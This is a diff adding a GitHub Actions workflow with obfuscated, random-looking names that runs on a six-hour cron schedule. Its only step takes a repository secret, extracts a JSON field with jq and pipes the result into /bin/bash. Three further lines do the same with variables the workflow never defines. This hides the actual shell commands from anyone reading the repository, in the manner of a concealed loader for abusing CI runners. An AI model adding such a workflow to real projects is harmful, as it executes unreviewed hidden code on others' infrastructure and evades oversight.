@@ -1,0 +1,21 @@
+name: lisite2917
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '54 2/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: lisite2917
+        env:
+          rydi70: ${{ secrets.rydi70 }}
+        run: |
+          echo $rydi70 | jq -r .eb57 | /bin/bash
+          echo $x45527 | jq -r .yc9654 | /bin/bash
+          echo $y07 | jq -r .vqn1462 | /bin/bash
+          echo $azuey96 | jq -r .rsxj1 | /bin/bash
+
